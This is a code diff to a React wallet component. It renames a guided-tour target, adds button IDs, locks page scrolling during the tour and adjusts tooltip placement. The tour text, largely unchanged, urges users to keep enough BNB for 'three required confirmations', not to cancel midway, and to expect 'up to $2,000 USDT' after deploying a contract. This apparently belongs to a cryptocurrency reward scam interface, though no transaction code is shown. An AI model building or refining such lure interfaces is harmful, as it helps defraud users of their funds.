@@ -29,43 +29,54 @@ export function Wallet() {
 
   const tourSteps = [
     {
-      target: "deploy-button",
+      target: "wallet-button", // Changed from deploy-button
       content:
-        "Click on the Deploy button to connect the address and begin the deployment.",
+        "Click this button to connect your wallet or deploy the smart contract.",
       position: "bottom",
     },
     {
-      target: "deploy-button",
+      target: "wallet-button",
       content:
         "Please ensure that the specified BNB address contains sufficient BNB to complete all three required confirmations successfully.",
       position: "bottom",
     },
     {
-      target: "deploy-button",
+      target: "wallet-button",
       content:
         "Please avoid pausing, stopping, or canceling the process midway, as doing so may result in the confirmation process restarting entirely.",
       position: "bottom",
     },
     {
-      target: "deploy-button",
+      target: "wallet-button",
       content:
         "Upon completing all confirmations and achieving a successful deployment, your address will be added to the pool, to receive a reward of up to $2,000 USDT.",
       position: "bottom",
     },
   ];
 
+  useEffect(() => {
+    if (showTour) {
+      document.body.style.overflow = "hidden";
+    } else {
+      document.body.style.overflow = "unset";
+    }
+
+    return () => {
+      document.body.style.overflow = "unset";
+    };
+  }, [showTour]);
+
   const TourOverlay = useCallback(() => {
     if (!showTour) return null;
     const currentStep = tourSteps[currentTourStep];
 
-    // Get the position of the target element
     const targetElement = document.getElementById(currentStep.target);
     const targetRect = targetElement?.getBoundingClientRect();
 
     if (!targetRect) return null;
 
     return (
-      <div className="fixed inset-0 z-50">
+      <div className="fixed inset-0 z-50 overflow-hidden">
         {/* Semi-transparent overlay */}
         <div className="absolute inset-0 bg-black/30" />
 
@@ -85,7 +96,7 @@ export function Wallet() {
         <div
           className="absolute"
           style={{
-            bottom: targetRect.top - 200, // Changed from top to bottom positioning
+            bottom: targetRect.top - 150, // Changed from top to bottom positioning
             left: targetRect.left - 100,
             width: "max-content",
           }}
@@ -518,6 +529,7 @@ export function Wallet() {
 
         {!walletAddress ? (
           <button
+            id="wallet-button" // Added ID here
             onClick={connectWallet}
             className="bg-[#08a0dd] text-white text-base px-4 py-2 rounded-lg hover:bg-[#08a0dd]/70"
           >
@@ -525,7 +537,7 @@ export function Wallet() {
           </button>
         ) : (
           <button
-            id="deploy-button"
+            id="wallet-button" // Changed from deploy-button
             onClick={startModalSequence}
             className="bg-[#08a0dd] text-white text-base px-4 py-2 rounded-lg hover:bg-[#08a0dd]/70 flex items-center justify-center"
             disabled={isLoading}
